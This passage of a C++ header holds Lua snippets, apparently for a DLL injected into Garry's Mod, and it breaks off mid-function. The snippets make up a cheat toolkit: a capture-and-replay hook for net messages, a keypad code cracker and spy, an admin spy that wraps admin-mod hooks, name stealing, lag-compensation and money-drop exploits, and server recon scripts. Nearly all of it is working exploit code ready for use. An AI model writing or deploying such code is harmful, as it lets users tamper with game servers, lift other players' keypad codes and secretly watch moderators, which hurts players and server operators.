	// 25. ConVar Dump -- read 30+ server/game convars
	// -----------------------------------------------------------------------
	inline const char* LUA_CONVAR_DUMP = R"lua(
local r = ""
pcall(function()
    local cvars = {
        "sv_allowcslua","sv_cheats","sv_maxrate","sv_minrate",
        "sv_maxupdaterate","sv_gravity","sv_friction","sv_accelerate",
        "sv_airaccelerate","sv_maxspeed","sv_maxvelocity",
        "host_timescale","mp_friendlyfire","mp_autoteambalance",
        "sbox_noclip","sbox_godmode","sbox_maxprops",
        "sv_alltalk","gmod_physiterations","sv_password",
        "rp_printamount","rp_paycheck","rp_maxlaws",
        "rp_license","rp_arrests","rp_doorprice",
        "sv_minupdaterate","sv_maxcmdrate","sv_mincmdrate",
        "net_maxfilesize","sv_kickerrornum"
    }
    for _, name in ipairs(cvars) do
        local ok, cv = pcall(GetConVar, name)
        if ok and cv then
            local sok, val = pcall(cv.GetString, cv)
            if sok and val then
                r = r .. name .. "\t" .. val .. "\n"
            else
                r = r .. name .. "\t[error]\n"
            end
        end
    end
end)
return r
)lua";

	// -----------------------------------------------------------------------
	// 26. Net Replay Capture -- hook net.Write* to capture outgoing payloads
	// -----------------------------------------------------------------------
	inline const char* LUA_NET_REPLAY_CAPTURE = R"lua(
pcall(function()
    if _fdll_replay_capture_active then return end
    _fdll_replay_capture_active = true
    _fdll_replay_buffer = _fdll_replay_buffer or {}
    _fdll_replay_current = nil

    local origStart = _fdll_origNetStart or net.Start
    _fdll_origNetStart = origStart
    local origSend = _fdll_origNetSendToServer or net.SendToServer
    _fdll_origNetSendToServer = origSend

    net.Start = function(name, ...)
        _fdll_replay_current = {name = name, writes = {}}
        return origStart(name, ...)
    end

    local writeFuncs = {"WriteString","WriteUInt","WriteInt","WriteFloat","WriteBool","WriteEntity"}
    for _, fname in ipairs(writeFuncs) do
        local origFn = net[fname]
        if origFn then
            local savedName = "_fdll_orig_net_" .. fname
            _G[savedName] = _G[savedName] or origFn
            net[fname] = function(...)
                if _fdll_replay_current then
                    table.insert(_fdll_replay_current.writes, {func = fname, args = {...}})
                end
                return _G[savedName](...)
            end
        end
    end

    net.SendToServer = function(...)
        if _fdll_replay_current then
            table.insert(_fdll_replay_buffer, _fdll_replay_current)
            if #_fdll_replay_buffer > 10 then table.remove(_fdll_replay_buffer, 1) end
            _fdll_replay_current = nil
        end
        return origSend(...)
    end
end)
)lua";

	// -----------------------------------------------------------------------
	// 27. Net Replay Send -- replay the most recent captured net message
	// -----------------------------------------------------------------------
	inline const char* LUA_NET_REPLAY_SEND = R"lua(
local r = ""
pcall(function()
    if not _fdll_replay_buffer or #_fdll_replay_buffer == 0 then
        r = "No captured messages to replay.\n"
        return
    end
    local msg = _fdll_replay_buffer[#_fdll_replay_buffer]
    if not msg or not msg.name then
        r = "Invalid replay entry.\n"
        return
    end
    local origStart = _fdll_origNetStart or net.Start
    local origSend = _fdll_origNetSendToServer or net.SendToServer
    origStart(msg.name)
    local writeCount = 0
    for _, w in ipairs(msg.writes or {}) do
        local origFn = _G["_fdll_orig_net_" .. w.func] or net[w.func]
        if origFn and w.args then
            origFn(unpack(w.args))
            writeCount = writeCount + 1
        end
    end
    origSend()
    r = "REPLAYED\t" .. msg.name .. "\t" .. writeCount .. " writes\n"
end)
return r
)lua";

	// -----------------------------------------------------------------------
	// 28. Entity Value Calc -- estimate money generation rates
	// -----------------------------------------------------------------------
	inline const char* LUA_ENTITY_VALUE_CALC = R"lua(
local r = ""
pcall(function()
    local totalCurrent = 0
    local totalRate = 0
    for _, e in ipairs(ents.GetAll()) do
        pcall(function()
            local cls = string.lower(e:GetClass() or "")
            local isPrinter = string.find(cls, "printer")
            local isDrug = string.find(cls, "drug") or string.find(cls, "meth") or string.find(cls, "weed")
            local isBitcoin = string.find(cls, "bitcoin") or string.find(cls, "miner")
            if not isPrinter and not isDrug and not isBitcoin then return end
            local owner = ""
            if e.Getowning_ent and IsValid(e:Getowning_ent()) then
                owner = e:Getowning_ent():Nick() or ""
            elseif e.GetPlayer and IsValid(e:GetPlayer()) then
                owner = e:GetPlayer():Nick() or ""
            end
            local current = 0
            if e.GetMoney then
                local s, m = pcall(e.GetMoney, e)
                if s and m then current = tonumber(m) or 0 end
            end
            -- Estimate rate per hour based on entity class
            local ratePerHour = 0
            if isPrinter then
                -- Base rate ~$250 per 300s = $3000/hr for basic
                local multiplier = 1
                if string.find(cls, "gold") or string.find(cls, "diamond") then multiplier = 4
                elseif string.find(cls, "silver") or string.find(cls, "platinum") then multiplier = 3
                elseif string.find(cls, "bronze") or string.find(cls, "advanced") then multiplier = 2
                end
                ratePerHour = 3000 * multiplier
            elseif isDrug then
                ratePerHour = 2000
            elseif isBitcoin then
                ratePerHour = 2500
            end
            totalCurrent = totalCurrent + current
            totalRate = totalRate + ratePerHour
            r = r .. string.format("%s\t%s\t$%d\t$%d/hr\n", cls, owner, current, ratePerHour)
        end)
    end
    r = r .. string.format("TOTAL\t\t$%d\t$%d/hr\n", totalCurrent, totalRate)
end)
return r
)lua";

	// -----------------------------------------------------------------------
	// 29. Killfeed Setup -- track player deaths and K/D stats
	// -----------------------------------------------------------------------
	inline const char* LUA_KILLFEED_SETUP = R"lua(
pcall(function()
    if _fdll_killfeed_active then return end
    _fdll_killfeed_active = true
    _fdll_killfeed = _fdll_killfeed or {}
    _fdll_kd_stats = _fdll_kd_stats or {}
    -- Try gameevent first
    pcall(function()
        gameevent.Listen("player_death")
    end)
    hook.Add("PlayerDeath", "_fdll_killfeed", function(victim, inflictor, attacker)
        pcall(function()
            local aNick = IsValid(attacker) and attacker:IsPlayer() and attacker:Nick() or "world"
            local vNick = IsValid(victim) and victim:Nick() or "unknown"
            local wep = ""
            if IsValid(inflictor) then
                if inflictor:IsWeapon() then
                    wep = inflictor:GetClass()
                elseif inflictor:IsPlayer() and IsValid(inflictor:GetActiveWeapon()) then
                    wep = inflictor:GetActiveWeapon():GetClass()
                else
                    wep = inflictor:GetClass()
                end
            end
            table.insert(_fdll_killfeed, {
                a = aNick, v = vNick, w = wep, t = CurTime()
            })
            if #_fdll_killfeed > 100 then table.remove(_fdll_killfeed, 1) end
            -- Update K/D stats
            if aNick ~= "world" then
                _fdll_kd_stats[aNick] = _fdll_kd_stats[aNick] or {k=0, d=0}
                _fdll_kd_stats[aNick].k = _fdll_kd_stats[aNick].k + 1
            end
            _fdll_kd_stats[vNick] = _fdll_kd_stats[vNick] or {k=0, d=0}
            _fdll_kd_stats[vNick].d = _fdll_kd_stats[vNick].d + 1
        end)
    end)
    -- Also hook entity_killed for clientside
    hook.Add("entity_killed", "_fdll_killfeed_ev", function(data)
        pcall(function()
            if not data then return end
            local attacker = Entity(data.entindex_attacker or 0)
            local victim = Entity(data.entindex_killed or 0)
            if not IsValid(victim) or not victim:IsPlayer() then return end
            local aNick = IsValid(attacker) and attacker:IsPlayer() and attacker:Nick() or "world"
            local vNick = victim:Nick() or "unknown"
            local inflictor = Entity(data.entindex_inflictor or 0)
            local wep = IsValid(inflictor) and inflictor:GetClass() or "unknown"
            table.insert(_fdll_killfeed, {
                a = aNick, v = vNick, w = wep, t = CurTime()
            })
            if #_fdll_killfeed > 100 then table.remove(_fdll_killfeed, 1) end
            if aNick ~= "world" then
                _fdll_kd_stats[aNick] = _fdll_kd_stats[aNick] or {k=0, d=0}
                _fdll_kd_stats[aNick].k = _fdll_kd_stats[aNick].k + 1
            end
            _fdll_kd_stats[vNick] = _fdll_kd_stats[vNick] or {k=0, d=0}
            _fdll_kd_stats[vNick].d = _fdll_kd_stats[vNick].d + 1
        end)
    end)
end)
)lua";

	// -----------------------------------------------------------------------
	// 30. Killfeed Read -- return recent kills and K/D stats
	// -----------------------------------------------------------------------
	inline const char* LUA_KILLFEED_READ = R"lua(
local r = ""
pcall(function()
    -- Recent kills (last 30)
    if _fdll_killfeed then
        local start = math.max(1, #_fdll_killfeed - 29)
        for i = start, #_fdll_killfeed do
            local e = _fdll_killfeed[i]
            if e then
                r = r .. string.format("KILL\t%.1f\t%s\t%s\t%s\n",
                    e.t or 0, e.a or "?", e.v or "?", e.w or "?")
            end
        end
    end
    -- K/D stats for all players
    if _fdll_kd_stats then
        for name, stats in pairs(_fdll_kd_stats) do
            r = r .. string.format("STAT\t%s\t%d\t%d\n",
                name, stats.k or 0, stats.d or 0)
        end
    end
    if r == "" then r = "No kill data yet.\n" end
end)
return r
)lua";

	// -----------------------------------------------------------------------
	// 31. Voice Spy Setup -- track who is speaking via voice
	// -----------------------------------------------------------------------
	inline const char* LUA_VOICE_SPY_SETUP = R"lua(
pcall(function()
    if _fdll_voice_spy_active then return end
    _fdll_voice_spy_active = true
    _fdll_voice_active = _fdll_voice_active or {}
    hook.Add("PlayerStartVoice", "_fdll_voice_start", function(ply)
        pcall(function()
            if IsValid(ply) then
                _fdll_voice_active[ply:EntIndex()] = ply:Nick()
            end
        end)
    end)
    hook.Add("PlayerEndVoice", "_fdll_voice_end", function(ply)
        pcall(function()
            if IsValid(ply) then
                _fdll_voice_active[ply:EntIndex()] = nil
            end
        end)
    end)
end)
)lua";

	// -----------------------------------------------------------------------
	// 32. Voice Spy Read -- return currently speaking players
	// -----------------------------------------------------------------------
	inline const char* LUA_VOICE_SPY_READ = R"lua(
local r = ""
pcall(function()
    if not _fdll_voice_active then return end
    for idx, name in pairs(_fdll_voice_active) do
        r = r .. tostring(idx) .. "\t" .. tostring(name) .. "\n"
    end
    if r == "" then r = "No one is currently speaking.\n" end
end)
return r
)lua";

	// -----------------------------------------------------------------------
	// 33. File Save -- persist session data to DATA folder
	// -----------------------------------------------------------------------
	inline const char* LUA_FILE_SAVE = R"lua(
local r = ""
pcall(function()
    _fdll_session_data = _fdll_session_data or {}
    -- Collect known data into session
    if _fdll_keypad_codes then
        for k, v in pairs(_fdll_keypad_codes) do
            _fdll_session_data["keypad_" .. tostring(k)] = tostring(v)
        end
    end
    if _fdll_player_notes then
        for k, v in pairs(_fdll_player_notes) do
            _fdll_session_data["note_" .. tostring(k)] = tostring(v)
        end
    end
    -- Serialize to key=value format
    local content = ""
    for k, v in pairs(_fdll_session_data) do
        content = content .. tostring(k) .. "=" .. tostring(v) .. "\n"
    end
    file.Write("friendlydll_data.txt", content)
    r = "Saved " .. tostring(#content) .. " bytes to friendlydll_data.txt\n"
end)
return r
)lua";

	// -----------------------------------------------------------------------
	// 34. File Load -- restore session data from DATA folder
	// -----------------------------------------------------------------------
	inline const char* LUA_FILE_LOAD = R"lua(
local r = ""
pcall(function()
    local content = file.Read("friendlydll_data.txt", "DATA")
    if not content or content == "" then
        r = "No saved data found.\n"
        return
    end
    _fdll_session_data = {}
    local count = 0
    for line in string.gmatch(content, "[^\n]+") do
        local key, val = string.match(line, "^(.-)=(.*)$")
        if key and val then
            _fdll_session_data[key] = val
            count = count + 1
        end
    end
    -- Restore keypad codes and player notes
    _fdll_keypad_codes = _fdll_keypad_codes or {}
    _fdll_player_notes = _fdll_player_notes or {}
    for k, v in pairs(_fdll_session_data) do
        if string.sub(k, 1, 7) == "keypad_" then
            _fdll_keypad_codes[string.sub(k, 8)] = v
        elseif string.sub(k, 1, 5) == "note_" then
            _fdll_player_notes[string.sub(k, 6)] = v
        end
    end
    r = "Loaded " .. count .. " entries from friendlydll_data.txt\n"
end)
return r
)lua";

	// -----------------------------------------------------------------------
	// 35. Keypad Cracker -- scan keypads, read codes, try common combos
	// -----------------------------------------------------------------------
	inline const char* LUA_KEYPAD_SCAN = R"lua(
local r = ""
pcall(function()
    local lp = LocalPlayer()
    if not IsValid(lp) then return end
    local myPos = lp:GetPos()
    local found = 0
    for _, e in ipairs(ents.GetAll()) do
        local cls = string.lower(e:GetClass() or "")
        if string.find(cls, "keypad") then
            local pos = e:GetPos()
            local dist = myPos:Distance(pos)
            local code = ""
            if e.GetCode then
                local s, c = pcall(e.GetCode, e)
                if s and c and tonumber(c) then code = tostring(c) end
            end
            if code == "" and e.dt then
                for _, field in ipairs({"code","password","keypadcode","Code"}) do
                    if e.dt[field] then
                        code = tostring(e.dt[field])
                        if code ~= "" and code ~= "0" then break end
                        code = ""
                    end
                end
            end
            if code == "" then
                for i = 0, 7 do
                    local s, v = pcall(e.GetDTInt, e, i)
                    if s and v and v > 0 and v < 100000 then
                        code = tostring(v)
                        break
                    end
                end
            end
            local linked = ""
            if e.GetLinkedEnt then
                local s, le = pcall(e.GetLinkedEnt, e)
                if s and IsValid(le) then linked = le:GetClass() end
            end
            if e.GetLinkedEntity then
                local s, le = pcall(e.GetLinkedEntity, e)
                if s and IsValid(le) then linked = le:GetClass() end
            end
            local owner = ""
            if e.Getowning_ent and IsValid(e:Getowning_ent()) then
                owner = e:Getowning_ent():Nick() or ""
            end
            r = r .. math.floor(pos.x) .. "\t" .. math.floor(pos.y) .. "\t" .. math.floor(pos.z)
                .. "\t" .. code .. "\t" .. linked .. "\t" .. owner
                .. "\t" .. math.floor(dist) .. "\t" .. cls .. "\n"
            found = found + 1
        end
    end
    if found == 0 then r = "NO_KEYPADS\n" end
end)
return r
)lua";

	// -----------------------------------------------------------------------
	// 36. Keypad Spy -- hook keypad UI to capture entered codes
	// -----------------------------------------------------------------------
	inline const char* LUA_KEYPAD_SPY_SETUP = R"lua(
pcall(function()
    if _fdll_keypad_spy then return end
    _fdll_keypad_spy = true
    _fdll_keypad_entries = _fdll_keypad_entries or {}

    local keypadNets = {
        "gmod_keypad","Keypad_Toggle","Keypad_Password",
        "keypad_entry","keypad_code","FPP_KeypadAccess",
        "DarkRP_Keypad","bw_keypad"
    }
    if net.Receivers then
        for _, name in ipairs(keypadNets) do
            if net.Receivers[name] then
                local origFn = net.Receivers[name]
                local capName = name
                net.Receivers[name] = function(len, ply)
                    table.insert(_fdll_keypad_entries, {
                        n = capName,
                        t = CurTime(),
                        l = len
                    })
                    if #_fdll_keypad_entries > 50 then
                        table.remove(_fdll_keypad_entries, 1)
                    end
                    origFn(len, ply)
                end
            end
        end
    end
end)
)lua";

	inline const char* LUA_KEYPAD_SPY_READ = R"lua(
local r = ""
pcall(function()
    if not _fdll_keypad_entries then return end
    for _, e in ipairs(_fdll_keypad_entries) do
        r = r .. string.format("%.1f", e.t) .. "\t" .. e.n .. "\t" .. e.l .. "\n"
    end
end)
return r
)lua";

	// -----------------------------------------------------------------------
	// 37. Auto-Pickup -- collect nearby money, weapons, items
	// -----------------------------------------------------------------------
	inline const char* LUA_AUTO_PICKUP = R"lua(
pcall(function()
    local lp = LocalPlayer()
    if not IsValid(lp) or not lp:Alive() then return end
    local pos = lp:GetPos()
    local eyePos = lp:EyePos()
    local range = 120

    for _, e in ipairs(ents.FindInSphere(pos, range)) do
        if not IsValid(e) then continue end
        local cls = string.lower(e:GetClass() or "")
        local isPickup = string.find(cls, "money") or string.find(cls, "cash")
            or string.find(cls, "moneybag") or string.find(cls, "ammo")
            or string.find(cls, "weapon_") or string.find(cls, "item_")
        if isPickup then
            local dir = (e:GetPos() - eyePos):GetNormalized()
            local ang = dir:Angle()
            lp:SetEyeAngles(ang)
            RunConsoleCommand("+use")
            timer.Simple(0.05, function()
                RunConsoleCommand("-use")
            end)
            break
        end
    end
end)
)lua";

	// -----------------------------------------------------------------------
	// 38. Auto-Collect Printer Money -- press E on nearby printers
	// -----------------------------------------------------------------------
	inline const char* LUA_AUTO_COLLECT_PRINTERS = R"lua(
pcall(function()
    local lp = LocalPlayer()
    if not IsValid(lp) or not lp:Alive() then return end
    local pos = lp:GetPos()

    for _, e in ipairs(ents.GetAll()) do
        if not IsValid(e) then continue end
        local cls = string.lower(e:GetClass() or "")
        if not string.find(cls, "printer") then continue end
        if pos:Distance(e:GetPos()) > 120 then continue end

        local money = 0
        if e.GetStoredMoney then
            local s, m = pcall(e.GetStoredMoney, e)
            if s and m then money = tonumber(m) or 0 end
        end
        if money <= 0 and e.GetMoney then
            local s, m = pcall(e.GetMoney, e)
            if s and m then money = tonumber(m) or 0 end
        end
        if money > 0 then
            local dir = (e:GetPos() + Vector(0,0,20) - lp:EyePos()):GetNormalized()
            lp:SetEyeAngles(dir:Angle())
            RunConsoleCommand("+use")
            timer.Simple(0.05, function() RunConsoleCommand("-use") end)
            break
        end
    end
end)
)lua";

	// -----------------------------------------------------------------------
	// 39. Admin Spy -- hook ULX, admin chat, admin actions
	// -----------------------------------------------------------------------
	inline const char* LUA_ADMIN_SPY_SETUP = R"lua(
pcall(function()
    if _fdll_admin_spy then return end
    _fdll_admin_spy = true
    _fdll_admin_log = _fdll_admin_log or {}

    local function logAdmin(category, msg)
        table.insert(_fdll_admin_log, {
            t = CurTime(),
            cat = category,
            msg = msg
        })
        if #_fdll_admin_log > 100 then
            table.remove(_fdll_admin_log, 1)
        end
    end

    hook.Add("OnPlayerChat", "_fdll_aspy_chat", function(ply, text, teamChat)
        if not IsValid(ply) then return end
        local isAdmin = ply:IsAdmin() or ply:IsSuperAdmin()
        if isAdmin then
            logAdmin("ADMIN_CHAT", ply:Nick() .. ": " .. text)
        end
        if string.sub(text, 1, 1) == "!" or string.sub(text, 1, 1) == "/" then
            logAdmin("CMD", ply:Nick() .. " -> " .. text)
        end
    end)

    local adminNets = {
        "ulx","ULib","xAdmin","sam_","SAM_","serverguard",
        "sAdmin","fadmin","FAdmin","bLogs","blogger"
    }
    if net.Receivers then
        for name, fn in pairs(net.Receivers) do
            local low = string.lower(name)
            for _, prefix in ipairs(adminNets) do
                if string.find(low, string.lower(prefix)) then
                    local origFn = fn
                    local capName = name
                    net.Receivers[name] = function(len, ply)
                        logAdmin("NET", capName .. " (len=" .. len .. ")")
                        origFn(len, ply)
                    end
                    break
                end
            end
        end
    end

    hook.Add("PlayerInitialSpawn", "_fdll_aspy_spawn", function(ply)
        if IsValid(ply) and (ply:IsAdmin() or ply:IsSuperAdmin()) then
            logAdmin("JOIN", (ply:IsSuperAdmin() and "SUPERADMIN" or "ADMIN") .. " joined: " .. ply:Nick())
        end
    end)

    local origAdd = hook.Add
    hook.Add = function(event, id, fn, ...)
        local low = string.lower(tostring(id))
        for _, kw in ipairs({"ulx","ulib","admin","moderate","ban","kick","jail","slay","warn"}) do
            if string.find(low, kw) then
                logAdmin("HOOK_ADD", event .. " / " .. tostring(id))
                break
            end
        end
        return origAdd(event, id, fn, ...)
    end
end)
)lua";

	inline const char* LUA_ADMIN_SPY_READ = R"lua(
local r = ""
pcall(function()
    if not _fdll_admin_log then return end
    for _, e in ipairs(_fdll_admin_log) do
        r = r .. string.format("%.1f", e.t) .. "\t" .. e.cat .. "\t" .. e.msg .. "\n"
    end
end)
return r
)lua";

	// -----------------------------------------------------------------------
	// 40. Name Stealer -- copy target player's name
	// -----------------------------------------------------------------------
	inline const char* LUA_NAME_STEAL = R"lua(
local r = ""
pcall(function()
    local players = player.GetAll()
    if #players < 2 then r = "Not enough players" return end
    local lp = LocalPlayer()
    local targets = {}
    for _, p in ipairs(players) do
        if p ~= lp then table.insert(targets, p) end
    end
    local target = targets[math.random(#targets)]
    local name = target:Nick()
    RunConsoleCommand("setinfo", "name", name)
    r = "Stole name: " .. name
end)
return r
)lua";

	// -----------------------------------------------------------------------
	// 41. Lag Compensation Exploit -- maximize interp for extended backtrack
	// -----------------------------------------------------------------------
	inline const char* LUA_LAGCOMP_EXPLOIT = R"lua(
pcall(function()
    RunConsoleCommand("cl_interp", "0.5")
    RunConsoleCommand("cl_interp_ratio", "5")
    RunConsoleCommand("cl_cmdrate", "20")
    RunConsoleCommand("cl_updaterate", "20")
end)
)lua";

	inline const char* LUA_LAGCOMP_RESET = R"lua(
pcall(function()
    RunConsoleCommand("cl_interp", "0")
    RunConsoleCommand("cl_interp_ratio", "2")
    RunConsoleCommand("cl_cmdrate", "66")
    RunConsoleCommand("cl_updaterate", "66")
end)
)lua";

	// -----------------------------------------------------------------------
	// 42. Player Model Changer -- change local player model via Lua
	// -----------------------------------------------------------------------
	inline const char* LUA_MODEL_LIST = R"lua(
local r = ""
pcall(function()
    local models = player_manager.AllValidModels()
    if models then
        for name, path in pairs(models) do
            r = r .. name .. "\t" .. path .. "\n"
        end
    end
end)
return r
)lua";

	// -----------------------------------------------------------------------
	// 43. Crosshair Target Info -- get info about entity under crosshair
	// -----------------------------------------------------------------------
	inline const char* LUA_CROSSHAIR_INFO = R"lua(
local r = ""
pcall(function()
    local lp = LocalPlayer()
    if not IsValid(lp) then return end
    local tr = lp:GetEyeTrace()
    if not tr.Hit or not IsValid(tr.Entity) then return end
    local e = tr.Entity
    r = e:GetClass() .. "\t"
    if e:IsPlayer() then
        r = r .. e:Nick() .. "\t"
        r = r .. e:Health() .. "\t"
        if e.getDarkRPVar then
            r = r .. tostring(e:getDarkRPVar("job") or "") .. "\t"
            r = r .. tostring(e:getDarkRPVar("money") or 0)
        end
    else
        r = r .. (e:GetModel() or "") .. "\t"
        r = r .. tostring(e:Health()) .. "\t"
        local owner = ""
        if e.Getowning_ent and IsValid(e:Getowning_ent()) then
            owner = e:Getowning_ent():Nick()
        end
        r = r .. owner
    end
end)
return r
)lua";

	// -----------------------------------------------------------------------
	// 44. Prop Counter -- count props per player for admin/raid intel
	// -----------------------------------------------------------------------
	inline const char* LUA_PROP_COUNTER = R"lua(
local r = ""
pcall(function()
    local counts = {}
    for _, e in ipairs(ents.FindByClass("prop_physics*")) do
        local owner = "World"
        if e.CPPIGetOwner then
            local s, o = pcall(e.CPPIGetOwner, e)
            if s and IsValid(o) then owner = o:Nick() end
        end
        counts[owner] = (counts[owner] or 0) + 1
    end
    local sorted = {}
    for name, count in pairs(counts) do
        table.insert(sorted, {name = name, count = count})
    end
    table.sort(sorted, function(a, b) return a.count > b.count end)
    for _, entry in ipairs(sorted) do
        r = r .. entry.name .. "\t" .. entry.count .. "\n"
    end
end)
return r
)lua";

	// -----------------------------------------------------------------------
	// 45. Auto-Warrant -- police class auto-warrant nearby wanted players
	// -----------------------------------------------------------------------
	inline const char* LUA_AUTO_WARRANT = R"lua(
local r = ""
pcall(function()
    local lp = LocalPlayer()
    if not IsValid(lp) then return end
    local team = lp:Team()
    local teamName = team_GetName and team_GetName(team) or ""
    local isPolice = false
    if DarkRP and DarkRP.getPhrase then
        isPolice = lp:isCP() or teamName:lower():find("police") or teamName:lower():find("chief") or teamName:lower():find("mayor")
    end
    if not isPolice then r = "NOT_POLICE" return end

    local count = 0
    for _, ply in ipairs(player.GetAll()) do
        if ply ~= lp and IsValid(ply) and ply:Alive() then
            if ply:getDarkRPVar("wanted") then
                local dist = lp:GetPos():Distance(ply:GetPos())
                if dist < 1000 then
                    local name = ply:Nick()
                    RunConsoleCommand("darkrp", "warrant", name, "Automated warrant")
                    count = count + 1
                    r = r .. "Warranted: " .. name .. " (" .. math.floor(dist) .. "u)\n"
                end
            end
        end
    end
    if count == 0 then r = "No wanted players nearby" end
end)
return r
)lua";

	// -----------------------------------------------------------------------
	// 46. Auto-Arrest -- arrest player under crosshair
	// -----------------------------------------------------------------------
	inline const char* LUA_AUTO_ARREST = R"lua(
local r = ""
pcall(function()
    local lp = LocalPlayer()
    if not IsValid(lp) then return end
    local tr = lp:GetEyeTrace()
    if not tr.Hit or not IsValid(tr.Entity) or not tr.Entity:IsPlayer() then
        r = "No player in crosshair"
        return
    end
    local target = tr.Entity
    local dist = lp:GetPos():Distance(target:GetPos())
    if dist > 200 then r = "Too far (" .. math.floor(dist) .. "u)" return end
    RunConsoleCommand("darkrp", "arrest", target:Nick())
    r = "Arresting: " .. target:Nick()
end)
return r
)lua";

	// -----------------------------------------------------------------------
	// 47. Chat Auto-Advert -- send periodic /advert messages
	// -----------------------------------------------------------------------
	inline const char* LUA_CHAT_ADVERT = R"lua(
pcall(function()
    if _fdll_advert_installed then return end
    _fdll_advert_installed = true
    _fdll_advert_msgs = _fdll_advert_msgs or {}
    _fdll_advert_idx = 0
    _fdll_advert_interval = 120

    timer.Create("_fdll_advert", _fdll_advert_interval, 0, function()
        if #_fdll_advert_msgs == 0 then return end
        _fdll_advert_idx = (_fdll_advert_idx % #_fdll_advert_msgs) + 1
        local msg = _fdll_advert_msgs[_fdll_advert_idx]
        RunConsoleCommand("say", "/advert " .. msg)
    end)
end)
)lua";

	inline const char* LUA_CHAT_ADVERT_STOP = R"lua(
pcall(function()
    timer.Remove("_fdll_advert")
    _fdll_advert_installed = nil
end)
)lua";

	// -----------------------------------------------------------------------
	// 48. Damage Tracker -- hooks to track damage dealt via bullet callbacks
	// -----------------------------------------------------------------------
	inline const char* LUA_DAMAGE_TRACKER_SETUP = R"lua(
pcall(function()
    if _fdll_dmg_installed then return end
    _fdll_dmg_installed = true
    _fdll_dmg_log = _fdll_dmg_log or {}

    hook.Add("EntityTakeDamage", "_fdll_dmg", function(target, dmginfo)
        local attacker = dmginfo:GetAttacker()
        local lp = LocalPlayer()
        if not IsValid(lp) then return end
        if attacker == lp and IsValid(target) then
            local amt = math.floor(dmginfo:GetDamage())
            local pos = target:GetPos()
            table.insert(_fdll_dmg_log, {
                a = amt,
                x = pos.x, y = pos.y, z = pos.z,
                t = CurTime(),
                d = true
            })
        elseif target == lp and IsValid(attacker) then
            local amt = math.floor(dmginfo:GetDamage())
            local pos = lp:GetPos()
            table.insert(_fdll_dmg_log, {
                a = amt,
                x = pos.x, y = pos.y, z = pos.z,
                t = CurTime(),
                d = false
            })
        end
        if #_fdll_dmg_log > 100 then table.remove(_fdll_dmg_log, 1) end
    end)
end)
)lua";

	inline const char* LUA_DAMAGE_TRACKER_READ = R"lua(
local r = ""
pcall(function()
    if not _fdll_dmg_log then return end
    local start = math.max(1, #_fdll_dmg_log - 19)
    for i = start, #_fdll_dmg_log do
        local e = _fdll_dmg_log[i]
        if e then
            r = r .. string.format("%d\t%.1f\t%.1f\t%.1f\t%.2f\t%s\n",
                e.a, e.x, e.y, e.z, e.t, e.d and "1" or "0")
        end
    end
    _fdll_dmg_log = {}
end)
return r
)lua";

	// -----------------------------------------------------------------------
	// 49. Enhanced Keypad Spy with position data for door memory
	// -----------------------------------------------------------------------
	inline const char* LUA_KEYPAD_SPY_ENHANCED_READ = R"lua(
local r = ""
pcall(function()
    if not _fdll_keypad_entries then return end
    for _, entry in ipairs(_fdll_keypad_entries) do
        if entry.code and entry.code ~= "" then
            local pos = entry.pos or Vector(0,0,0)
            local owner = entry.owner or "unknown"
            r = r .. entry.code .. "\t" .. pos.x .. "\t" .. pos.y .. "\t" .. pos.z .. "\t" .. owner .. "\n"
        end
    end
end)
return r
)lua";

	// -----------------------------------------------------------------------
	// 50. Prop Surf Detector -- find surfable props nearby
	// -----------------------------------------------------------------------
	inline const char* LUA_PROP_SURF_SCAN = R"lua(
local r = ""
pcall(function()
    local lp = LocalPlayer()
    if not IsValid(lp) then return end
    local myPos = lp:GetPos()
    local found = 0

    for _, e in ipairs(ents.FindInSphere(myPos, 500)) do
        if IsValid(e) and (e:GetClass():find("prop_physics") or e:GetClass():find("prop_dynamic")) then
            local phys = e:GetPhysicsObject()
            if IsValid(phys) then
                local mass = phys:GetMass()
                local vel = phys:GetVelocity():Length()
                local frozen = phys:IsMotionEnabled() == false
                local model = e:GetModel() or ""
                local dist = myPos:Distance(e:GetPos())
                r = r .. string.format("%s\t%.0f\t%.0f\t%.0f\t%s\t%.0f\n",
                    model:match("[^/]+$") or model, mass, vel, dist,
                    frozen and "frozen" or "free", e:GetPos().z - myPos.z)
                found = found + 1
                if found >= 20 then break end
            end
        end
    end
    if found == 0 then r = "No physics props nearby" end
end)
return r
)lua";

	// -----------------------------------------------------------------------
	// 51. Money Drop Exploit -- rapidly drop and recollect money
	// -----------------------------------------------------------------------
	inline const char* LUA_MONEY_EXPLOIT = R"lua(
pcall(function()
    local lp = LocalPlayer()
    if not IsValid(lp) then return end
    for i = 1, 10 do
        timer.Simple(i * 0.15, function()
            RunConsoleCommand("darkrp", "dropmoney", "1")
        end)
    end
end)
)lua";

	// -----------------------------------------------------------------------
	// 52. Server Info Dump -- extract server details for recon
	// -----------------------------------------------------------------------
	inline const char* LUA_SERVER_INFO = R"lua(
local r = ""
pcall(function()
    r = r .. "Host: " .. GetHostName() .. "\n"
    r = r .. "Map: " .. game.GetMap() .. "\n"
    r = r .. "Players: " .. #player.GetAll() .. "/" .. game.MaxPlayers() .. "\n"
    r = r .. "Gamemode: " .. engine.ActiveGamemode() .. "\n"
    r = r .. "IP: " .. game.GetIPAddress() .. "\n"
    r = r .. "Tickrate: " .. math.floor(1 / engine.TickInterval()) .. "\n"

    local sv_cheats = GetConVar("sv_cheats")
    if sv_cheats then r = r .. "sv_cheats: " .. sv_cheats:GetString() .. "\n" end
    local sv_allowcslua = GetConVar("sv_allowcslua")
    if sv_allowcslua then r = r .. "sv_allowcslua: " .. sv_allowcslua:GetString() .. "\n" end

    r = r .. "\nWorkshop Addons:\n"
    local wsCount = 0
    for _, addon in ipairs(engine.GetAddons and engine.GetAddons() or {}) do
        if addon.mounted then
            r = r .. "  " .. addon.title .. "\n"
            wsCount = wsCount + 1
            if wsCount >= 15 then r = r .. "  ...+" .. (#engine.GetAddons() - 15) .. " more\n" break end
        end
    end
end)
return r
)lua";

	// -----------------------------------------------------------------------
	// 53. Player Teleport Detector -- detect players who teleport (noclip/admin)
	// -----------------------------------------------------------------------
	inline const char* LUA_TELEPORT_DETECT_SETUP = R"lua(
pcall(function()
    if _fdll_tp_installed then return end
    _fdll_tp_installed = true
    _fdll_tp_log = {}
    _fdll_tp_lastpos = {}

    hook.Add("Think", "_fdll_tp_detect", function()
        for _, ply in ipairs(player.GetAll()) do
            if IsValid(ply) and ply:Alive() and ply ~= LocalPlayer() then
                local idx = ply:EntIndex()
                local pos = ply:GetPos()
                local last = _fdll_tp_lastpos[idx]
                if last then
                    local dist = pos:Distance(last)
                    local vel = ply:GetVelocity():Length()
                    if dist > 500 and vel < 100 then
